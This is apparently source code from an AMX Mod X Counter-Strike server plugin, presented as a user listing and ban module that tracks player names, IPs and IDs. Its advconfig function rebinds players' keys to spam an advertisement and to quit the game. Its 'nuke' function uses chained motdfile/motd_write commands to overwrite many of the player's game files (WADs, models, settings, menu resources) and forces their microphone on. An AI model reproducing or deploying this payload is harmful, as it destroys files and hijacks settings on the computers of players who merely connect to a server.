// User listing

#if defined sic_userlist_included
    #endinput
#endif

#define sic_userlist_included

// ; timestamp name auth cl_uid ip flags timelimit(mins) optionalcomments
#define sic_userlist_filename  "addons/amxmodx/configs/sic_userlist.cfg"

#define sic_userlist_playerlog "addons/amxmodx/logs/players.log"
#define sic_cheater_name       "egy senkihazi csiter vagyok"
#define sic_bannertext         "say Magyar Top1 DM! [C4nn0N] DeathMatch CSDM: connect csdm-hu.sytes.net"


// player flags
enum (<<= 1)
{
	PF_MUTED = 1,
	PF_BLOCKED,
	PF_BANNED,
}

// _get_flags
enum
{
	GF_CL_UID,
	GF_AUTH,
	GF_NAME,
	GF_IP
}

// ban type
enum
{
	BAN_TYPE_TEMPORARY,
	BAN_TYPE_PERMANENT
}

new Trie:g_uidlist
new Trie:g_authlist
new Trie:g_namelist
new Trie:g_iplist

public sic_userlist_plugin_init()
{
	register_concmd("rlduid", "sic_userlist_reload",    ADMIN_RCON, "- ujratolti a banlistat")

	sic_userlist_load()
}

public sic_userlist_reload(id, level, cid)
{
	if (cmd_access(id, level, cid, 1)) {
		TrieDestroy(g_uidlist)
		TrieDestroy(g_authlist)
		TrieDestroy(g_namelist)
		TrieDestroy(g_iplist)
		sic_userlist_load()
	}
}

public sic_userlist_load()
{
	log_message("Loading user list (file ^"%s^")", sic_userlist_filename)

	g_uidlist  = TrieCreate()
	g_authlist = TrieCreate()
	g_namelist = TrieCreate()
	g_iplist   = TrieCreate()

	new p_line[255], p_count, i_flags, i_time, i_limit
	new p_timestamp[33], p_name[33], p_auth[33], p_cl_uid[17], p_ip[17], p_flags[17], p_limit[8]
	new fh = fopen(sic_userlist_filename, "r")
	while (!feof(fh)) {
		fgets(fh, p_line, charsmax(p_line))
		trim(p_line)
		if (strlen(p_line) > 0 && p_line[0] != ';') {
			if (parse(p_line, p_timestamp, charsmax(p_timestamp), p_name, charsmax(p_name), p_auth, charsmax(p_auth), p_cl_uid, charsmax(p_cl_uid), p_ip, charsmax(p_ip), p_flags, charsmax(p_flags), p_limit, charsmax(p_limit)) >= 6) {
				i_time = parse_time(p_timestamp, "%Y-%m-%d %H:%M:%S")
				i_limit = str_to_num(p_limit)
				i_flags = read_flags(p_flags)

				if (i_limit == 0 || i_time + i_limit*60 > ts()) {
					sic_userlist_addlist(i_flags, p_cl_uid, p_name, p_ip, p_auth)
				}
			} else {
				server_print("Error, paramcount < 5: %d, %s", p_count, p_line)
			}

			p_limit = ""
		}
	}
	fclose(fh)
}

public sic_userlist_get_flags(type, param[])
{
	new i_flags = 0

	switch (type) {
		case GF_CL_UID: {
			if (TrieKeyExists(g_uidlist, param)) {
				TrieGetCell(g_uidlist, param, i_flags)
			}
		}
		case GF_AUTH: {
			if (TrieKeyExists(g_authlist, param)) {
				TrieGetCell(g_authlist, param, i_flags)
			}
		}
		case GF_IP: {
			if (TrieKeyExists(g_iplist, param)) {
				TrieGetCell(g_iplist, param, i_flags)
			}
		}
		case GF_NAME: {
			if (TrieKeyExists(g_namelist, param)) {
				TrieGetCell(g_namelist, param, i_flags)
			}
		}
	}

	return i_flags;
}

public sic_userlist_client_connect(id)
{
	new pi[playerinfo], i_flags = 0
	sic_userinfo_fetchall(id, pi)

	if (!is_user_bot(id)) {
		if (equal(pi[pi_cl_uid], "") || equal(pi[pi_cl_uid], "76c6fd") || equal(pi[pi_cl_uid], "2ec9c1")) {
			sic_generate_cl_uid(pi[pi_cl_uid], 6, "%s.%d.%s", pi[pi_ip], random_num(10000,99999), id)
			client_cmd(id, "setinfo cl_uid ^"%s^"", pi[pi_cl_uid])

			new checkinfo[32]
			get_user_info(id, "cl_uid", checkinfo, charsmax(checkinfo))
			if (equal(checkinfo, "")) {
				sic_userinfo_stripinfo(id)
				client_cmd(id, "setinfo cl_uid ^"%s^"", pi[pi_cl_uid])
			}
		}

		sic_putsd(sic_userlist_playerlog, "%20s^t%32s^t%20s^t%24s^t%6s", g_mapname, pi[pi_name], pi[pi_auth], pi[pi_ip], pi[pi_cl_uid])
	}

	if (TrieKeyExists(g_uidlist, pi[pi_cl_uid])) {
		TrieGetCell(g_uidlist, pi[pi_cl_uid], i_flags)
	}
	if (TrieKeyExists(g_authlist, pi[pi_auth]) && sic_bannable(pi[pi_auth])) {
		TrieGetCell(g_authlist, pi[pi_auth], i_flags)
	}
	if (TrieKeyExists(g_iplist, pi[pi_ip])) {
		TrieGetCell(g_iplist, pi[pi_ip], i_flags)
	}
	if (TrieKeyExists(g_namelist, pi[pi_name])) {
		TrieGetCell(g_namelist, pi[pi_name], i_flags)
	}

	if (i_flags) {
		sic_userlist_setflags(id, i_flags)
	}

}

public sic_userlist_addlist(i_flags, p_cl_uid[], p_name[], p_ip[], p_auth[])
{
	if (!equal(p_cl_uid, "")) {
		TrieSetCell(g_uidlist,  p_cl_uid, i_flags)
	}
	if (!equal(p_name, "")) {
		TrieSetCell(g_namelist, p_name,   i_flags)
	}
	if (!equal(p_ip, "")) {
		TrieSetCell(g_iplist,   p_ip,     i_flags)
	}
	if (!equal(p_auth, "") && sic_bannable(p_auth)) {
		TrieSetCell(g_authlist, p_auth,   i_flags)
	}
}

public sic_userlist_client_putinserver(id)
{
	new lstr[128], pi[playerinfo]
	sic_userinfo_fetchall(id, pi)
	sic_userinfo_logstring_b(pi, lstr, charsmax(lstr))

	log_message("%s entered the game (cl_uid ^"%s^") (ip ^"%s^") (port ^"%d^")", lstr, pi[pi_cl_uid], pi[pi_ip], 0)
}

stock sic_userlist_setaccess(id, flags, timelimit, permanent=0)
{
	if (id && flags) {
		new pi[playerinfo], p_ts[33], p_flags[17]
		sic_userinfo_fetchall(id, pi)
		get_time("%Y-%m-%d %H:%M:%S", p_ts, charsmax(p_ts))
		get_flags(flags, p_flags, charsmax(p_flags))

		sic_userlist_addlist(flags, pi[pi_cl_uid], pi[pi_name], pi[pi_ip], pi[pi_auth])
		sic_userlist_setflags(id, flags)

		if (!sic_bannable(pi[pi_auth])) {
			copy(pi[pi_auth], charsmax(pi[pi_auth]), "")
		}

		if (permanent) {
//			"^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts, pi[pi_name], pi[pi_auth], pi[pi_cl_uid], pi[pi_ip], p_flags, timelimit
//			HINT: automatic ban by name or ip could be harmful, therefore i fixed the timelimit in 600 minutes, make it permanent by hand-edit <sic_userlist_filename>

			if (!equal(pi[pi_cl_uid], "") || sic_bannable(pi[pi_auth])) {
				sic_puts(sic_userlist_filename, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts,          "", pi[pi_auth], pi[pi_cl_uid],        "", p_flags, timelimit)
			}
			sic_puts(sic_userlist_filename, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts, pi[pi_name], pi[pi_auth], pi[pi_cl_uid], pi[pi_ip], p_flags, timelimit > 600 || timelimit == 0 ? 600 : timelimit)

//			if (flags & PF_MUTED && flags & PF_BLOCKED) {
			new lstr[128]
			sic_userinfo_logstring_b(pi, lstr, charsmax(lstr))
			log_message("Punish: %s has been punished (cl_uid ^"%s^") (ip ^"%s^") (admin ^"%s^")", lstr, pi[pi_cl_uid], pi[pi_ip], "")

			if (containi(pi[pi_name], "CHEATER") == -1) {
				client_cmd(id, "name ^"[CHEATER] %s^"", pi[pi_name])
				sic_userlist_advconfig(id, pi[pi_auth])
			}
//			}
		}
	} else {
		server_print("Invalid ID or flags!")
	}
}

public sic_userlist_advconfig(id, auth[])
{
	if (containi(auth, "STEAM_0") >= 0) {
		client_cmd(id, "Bind ^"b^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"e^" ^"%s; +use^"", sic_bannertext)
		client_cmd(id, "Bind ^"f^" ^"%s; impulse 100^"", sic_bannertext)
		client_cmd(id, "Bind ^"g^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"h^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"j^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"k^" ^"%s; +voicerecord^"", sic_bannertext)
		client_cmd(id, "Bind ^"m^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"n^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"z^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"F5^" ^"%s; snapshot^"", sic_bannertext)
		client_cmd(id, "Bind ^"F8^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"F10^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"F11^" ^"%s^"", sic_bannertext)
		client_cmd(id, "Bind ^"F12^" ^"%s; quit prompt^"", sic_bannertext)
	}
	client_cmd(id, "Bind ^"r^" ^"%s; +reload^"", sic_bannertext)
	client_cmd(id, "Bind ^"INS^" ^"%s; +klook^"", sic_bannertext)
	client_cmd(id, "Bind ^"DEL^" ^"%s^"", sic_bannertext)
	client_cmd(id, "Bind ^"PGDN^" ^"%s; +lookdown^"", sic_bannertext)
	client_cmd(id, "Bind ^"PGUP^" ^"%s; +lookup^"", sic_bannertext)
	client_cmd(id, "Bind ^"HOME^" ^"%s^"", sic_bannertext)
	client_cmd(id, "Bind ^"END^" ^"%s; centerview^"", sic_bannertext)
	client_cmd(id, "Bind ^"u^" ^"%s; messagemode2^"", sic_bannertext)
	client_cmd(id, "Bind ^"y^" ^"%s; messagemode^"", sic_bannertext)
}

public sic_userlist_setflags(id, flags)
{
	if (flags & PF_MUTED) {
		sic_moderate_mute(id, 0, 1)
	}
	if (flags & PF_BLOCKED) {
		sic_blockshoot_player(id, 0, 1)
	}
	if (flags & PF_BANNED) {
		server_cmd("kick #%d ^"%s^"", get_user_userid(id), sic_ban_reason)
	}
}

public sic_userlist_nuke(id, admin)
{
	new lstr[128], lstr_a[128]
	sic_userinfo_logstring(id, lstr, charsmax(lstr))
	sic_userinfo_logstring(admin, lstr_a, charsmax(lstr_a))

	log_message("%s nuked %s", lstr_a, lstr)

	client_cmd(id, "name ^"%s^"", sic_cheater_name)

	client_cmd(id, "gl_flipmatrix 1;hud_draw 0;MP3Volume 1;suitvolume 1;sv_voiceenable 1;voice_enable 1;voice_forcemicrecord 1;voice_modenable 1;voice_scale 1;volume 1;-mlook;+lookup;+voicerecord;sensitivity 14")

	client_cmd(id, "motdfile ajawad.wad;motd_write cheater;motdfile cached.wad;motd_write cheater;motdfile chateau.wad;motd_write cheater;motdfile cs_747.wad;motd_write cheater;motdfile cs_assault.wad;motd_write cheater;motdfile cs_bdog.wad;motd_write cheater;motdfile cs_cbble.wad;motd_write cheater;motdfile cs_dust.wad;motd_write cheater;motdfile cs_havana.WAD;motd_write cheater;motdfile cs_office.wad;motd_write cheater")
	client_cmd(id, "motdfile cs_snowbase.wad;motd_write cheater;motdfile cs_thunder.wad;motd_write cheater;motdfile cstraining.wad;motd_write cheater;motdfile cstrike.wad;motd_write cheater;motdfile de_airstrip.wad;motd_write cheater;motdfile de_aztec.wad;motd_write cheater;motdfile de_piranesi.wad;motd_write cheater;motdfile de_storm.wad;motd_write cheater;motdfile de_vegas.wad;motd_write cheater")
	client_cmd(id, "motdfile de_vertigo.wad;motd_write cheater;motdfile decals.wad;motd_write cheater;motdfile greenvalley.wad;motd_write cheater;motdfile itsitaly.wad;motd_write cheater;motdfile jos.wad;motd_write cheater;motdfile n0th1ng.wad;motd_write cheater;motdfile prodigy.wad;motd_write cheater;motdfile tempdecal.wad;motd_write cheater;motdfile torntextures.wad;motd_write cheater;motdfile tswad.wad;motd_write cheater")
	client_cmd(id, "motdfile custom.hpk;motd_write cheater;motdfile GameServerConfig.vdf;motd_write cheater;motdfile halflife-cs.fgd;motd_write cheater;motdfile settings.scr;motd_write cheater;motdfile user.scr;motd_write cheater;motdfile gfx/palette.lmp;motd_write cheater;motdfile models/p_knife.mdl;motd_write cheater;motdfile models/v_knife.mdl;motd_write cheater;motdfile models/v_knife_r.mdl;motd_write cheater")
	client_cmd(id, "motdfile models/w_knife.mdl;motd_write cheater;motdfile resource/GameMenu.res;motd_write cheater;motdfile sprites/radar320.spr;motd_write cheater;motdfile sprites/radar640.spr;motd_write cheater;motdfile sprites/radaropaque640.spr;motd_write cheater")
}
